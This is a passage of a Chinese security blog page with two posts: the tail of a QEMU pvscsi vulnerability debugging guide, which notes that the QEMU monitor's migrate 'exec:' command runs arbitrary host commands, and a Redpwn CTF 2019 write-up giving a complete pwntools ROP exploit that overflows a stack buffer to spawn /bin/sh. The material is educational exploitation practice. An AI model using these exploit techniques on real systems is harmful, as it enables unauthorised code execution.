class="keyword">static</span> <span class="keyword">void</span> <span class="title">m_exit</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;m_exit\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(m_init);</span><br><span class="line">module_exit(m_exit);</span><br></pre></td></tr></table></figure>
<p>Makefile如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PWD :&#x3D; $(shell pwd)</span><br><span class="line">KVERSION :&#x3D; $(shell uname -r)</span><br><span class="line">KERNEL_DIR &#x3D; &#x2F;usr&#x2F;src&#x2F;linux-headers-$(KVERSION)&#x2F;</span><br><span class="line"></span><br><span class="line">MODULE_NAME &#x3D; test</span><br><span class="line">obj-m :&#x3D; $(MODULE_NAME).o</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">	make -C $(KERNEL_DIR) M&#x3D;$(PWD) modules</span><br><span class="line">clean:</span><br><span class="line">	make -C $(KERNEL_DIR) M&#x3D;$(PWD) clean</span><br></pre></td></tr></table></figure>
<p>PoC中用到的与外设交互的知识在另外一篇文章中介绍。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>编译qemu-2.3.0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tar -jxvf .&#x2F;qemu-2.3.0.tar.bz2</span><br><span class="line">$ cd qemu-2.3.0&#x2F;</span><br><span class="line">$ .&#x2F;configure --enable-kvm --enable-debug --target-lsit&#x3D;x86_64-softmmu</span><br><span class="line">$ make -j4</span><br><span class="line">$ .&#x2F;qemu-2.3.0&#x2F;x86_64-softmmu&#x2F;qemu-system-x86_64 --enable-kvm -m 2096 .&#x2F;ubuntu.img -device pvscsi</span><br></pre></td></tr></table></figure>
<h2 id="调试Qemu"><a href="#调试Qemu" class="headerlink" title="调试Qemu"></a>调试Qemu</h2><p>在VMware中启动qemu后，用gdb attach到进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ps aux | grep qemu</span><br><span class="line">$ sudo gdb</span><br><span class="line">(gdb) attach &lt;qemu_pid&gt;</span><br><span class="line">...</span><br><span class="line">(gdb) break *pvscsi_io_write</span><br><span class="line">(gdb) c</span><br></pre></td></tr></table></figure>
<p>在刚刚启动的Qemu中编译安装内核模块（PoC）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">$ sleep 5; sudo insmod test.ko</span><br></pre></td></tr></table></figure>
<p>这里需要注意的是，在插入内核模块前的<code>sleep 5</code>是为了让鼠标有时间移出qemu虚拟机，如果直接插入模块会马上触发断点，鼠标就会被锁在qemu虚拟机中，还需要注意，在执行命令前需要先执行一次sudo+任意cmd，否则<code>sleep 5</code>之后还需要输入密码，鼠标也会被锁在qemu虚拟机中。<br><img src="/images/qemu/dbgqemu.png"></p>
<p><strong>附录</strong><br>Qemu monitor攻击面<br>进入方式：  </p>
<ol>
<li>Ctrl+alt+2</li>
<li>Ctrl+a，c</li>
</ol>
<p>在Qemu monitor中可以直接对虚拟机进行管理，在未关掉Qemu monitor的虚拟机中可以直接在host执行任意命令。<br>关闭Qemu monitor：<code>-monitor /dev/null</code><br>执行命令：<code>migrate &quot;exec: &lt;your cmd&gt;&quot;</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/01/21/x64%E9%80%9A%E7%94%A8ROP-gadget/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/01/21/x64%E9%80%9A%E7%94%A8ROP-gadget/" class="post-title-link" itemprop="url">x64通用ROP gadget</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2020-01-21 16:57:57" itemprop="dateCreated datePublished" datetime="2020-01-21T16:57:57+08:00">2020-01-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是一道Redpwn CTF 2019很简单的溢出题，主要考察ROP exp的编写。<br>[srnr](<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/174jiewXQISoHb08Aqisy7Q">https://pan.baidu.com/s/174jiewXQISoHb08Aqisy7Q</a> 提取码: yt2r)<br>对二进制文件进行逆向分析，可以看到程序先读入了一个数字作为文件描述符，再从文件描述符中读取100000个字符，而buf是rbp-9，只要读超过17个字符就会覆盖到ret：<br><img src="/images/redpwn/srnr.png"><br>为了能调用<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，我们需要把rdi的地址设为<code>&quot;/bin/sh&quot;</code>的地址，并清空rsi和rdx。程序中存在字符串<code>&quot;/bin//sh&quot;</code>:<br><img src="/images/redpwn/srnr2.png"><br>可以用ROPgadget获取字符串的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary .&#x2F;srnr --string &quot;&#x2F;bin&#x2F;&#x2F;sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">0x0000000000400c49 : &#x2F;bin&#x2F;&#x2F;sh</span><br></pre></td></tr></table></figure>
<p>在main函数的ret指令之前下断点，查看寄存器值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; regs</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7ffff7af4081 (read+17) ◂— cmp    rax, -0x1000 &#x2F;* &#39;H&#x3D;&#39; *&#x2F;</span><br><span class="line"> RDX  0xffffffffffffff80</span><br><span class="line"> RDI  0x0</span><br><span class="line"> RSI  0x7fffffffdf27 ◂— 0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x7ffff7b82cc0 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x400600 (_start) ◂— xor    ebp, ebp</span><br><span class="line"> R13  0x7fffffffe010 ◂— 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7fffffffdf30 —▸ 0x4007c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdf20 —▸ 0x7fffffffe010 ◂— 0x1</span><br><span class="line"> RIP  0x4007b7 (main+124) ◂— leave </span><br></pre></td></tr></table></figure>
<p> 二进制程序比较小，找不到太多有用的gadget，这里采用的是一个通用gadget，<code>__libc_csu_init</code>函数是程序调用libc库用来对程序进行初始化的函数，一般先于main函数执行<br>而我们则是要利用<code>__libc_csu_init</code>其中两段特殊的gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400800 : mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]</span><br></pre></td></tr></table></figure>
<p>因为r14和r15已经是0了，这个gadget实际上为我们清空了rdx和rsi。rdi是0，我们可以用r13给rdi设置一个32位的地址，设置为<code>&quot;/bin//sh&quot;</code>的地址。rbx为0，因此可以通过控制r12 call任意函数。另一段gadget即为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040081c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br></pre></td></tr></table></figure>
<p>现在需要找一个指向syscall的指针分配给r12，采用的方法是找一块可写的内存，写入syscall的地址，再将这块内存的地址分配给r12。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      &#x2F;home&#x2F;fan&#x2F;Computer&#x2F;CTF&#x2F;redpwn&#x2F;srnr</span><br><span class="line">          0x601000           0x602000 r--p     1000 1000   &#x2F;home&#x2F;fan&#x2F;Computer&#x2F;CTF&#x2F;redpwn&#x2F;srnr</span><br><span class="line">          0x602000           0x603000 rw-p     1000 2000   &#x2F;home&#x2F;fan&#x2F;Computer&#x2F;CTF&#x2F;redpwn&#x2F;srnr</span><br><span class="line">    0x7ffff79e4000     0x7ffff7bcb000 r-xp   1e7000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">    0x7ffff7bcb000     0x7ffff7dcb000 ---p   200000 1e7000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">    0x7ffff7dcb000     0x7ffff7dcf000 r--p     4000 1e7000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">    0x7ffff7dcf000     0x7ffff7dd1000 rw-p     2000 1eb000 &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd5000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd5000     0x7ffff7dfc000 r-xp    27000 0      &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7ffff7fdf000     0x7ffff7fe1000 rw-p     2000 0      </span><br><span class="line">    0x7ffff7ff8000     0x7ffff7ffb000 r--p     3000 0      [vvar]</span><br><span class="line">    0x7ffff7ffb000     0x7ffff7ffc000 r-xp     1000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 27000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 28000  &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
<p>0x602000是可写的，把rdi设置为<code>&quot;%zu&quot;</code>，rsi设置为这个可写的buff，然后返回<code>__isoc99_scanf</code>即可从标准输入写到内存中，可以用如下gadget：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400823 : pop rdi ; ret</span><br><span class="line">0x0000000000400821 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure>
<p>最后需要做的就是将rax设为execve的系统调用号59（Ubuntu上64位系统调用号在/usr/include/x86_64-linux-gnu/asm/unistd_64.h中），<code>get_int</code>函数从stdin读取一个整数并返回，所以可以调用它来修改rax。<br>完整的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./srnr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x400703</span></span><br><span class="line">binsh = <span class="number">0x400c49</span></span><br><span class="line">pop4ret = <span class="number">0x40081c</span> <span class="comment"># pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="comment"># general gadget in x86-64</span></span><br><span class="line">gadget = <span class="number">0x400800</span> <span class="comment"># mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]</span></span><br><span class="line">poprdi = <span class="number">0x400823</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">poprsi = <span class="number">0x400821</span> <span class="comment"># pop rsi ; pop r15; ret</span></span><br><span class="line">ret = <span class="number">0x40059e</span></span><br><span class="line">fmtstr = <span class="number">0x400c52</span> <span class="comment"># &quot;%zu&quot;</span></span><br><span class="line">buff = <span class="number">0x602000</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./srnr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[#] number of bytes: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">17</span> <span class="comment"># padding</span></span><br><span class="line"><span class="comment"># __isoc99_scanf(fmtstr, buffer)</span></span><br><span class="line">payload += p64(poprsi).decode()</span><br><span class="line">payload += p64(buff).decode() <span class="comment"># rsi</span></span><br><span class="line">payload += p64(<span class="number">0</span>).decode() <span class="comment"># r15</span></span><br><span class="line">payload += p64(poprdi).decode()</span><br><span class="line">payload += p64(fmtstr).decode() <span class="comment"># rdi</span></span><br><span class="line">payload += <span class="string">&#x27;\xf0\x05@\x00\x00\x00\x00\x00&#x27;</span> <span class="comment"># p64(elf.sym[&#x27;__isoc99_scanf&#x27;]).decode()</span></span><br><span class="line"></span><br><span class="line">payload += <span class="string">&#x27;\x9e\x05@\x00\x00\x00\x00\x00&#x27;</span> <span class="comment"># p64(ret).decode() # 16 byte stack alignemnt</span></span><br><span class="line">payload += p64(elf.sym[<span class="string">&#x27;get_int&#x27;</span>]).decode()</span><br><span class="line"></span><br><span class="line">payload += p64(pop4ret).decode()</span><br><span class="line">payload += p64(buff).decode() <span class="comment"># r12</span></span><br><span class="line">payload += p64(binsh).decode() <span class="comment"># r13</span></span><br><span class="line">payload += p64(<span class="number">0</span>).decode() <span class="comment"># r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>).decode() <span class="comment"># r15</span></span><br><span class="line">payload += p64(gadget).decode()</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#p.sendline(p64(syscall).decode())</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(syscall))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;59&#x27;</span>)</span><br><span class="line">p.clean()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://www.pwndiary.com/write-ups/redpwn-ctf-2019-stop-rop-n-roll-write-up-pwn280/">https://www.pwndiary.com/write-ups/redpwn-ctf-2019-stop-rop-n-roll-write-up-pwn280/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Bruce Fan"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">Bruce Fan</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">125</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">17</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Bruce Fan</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
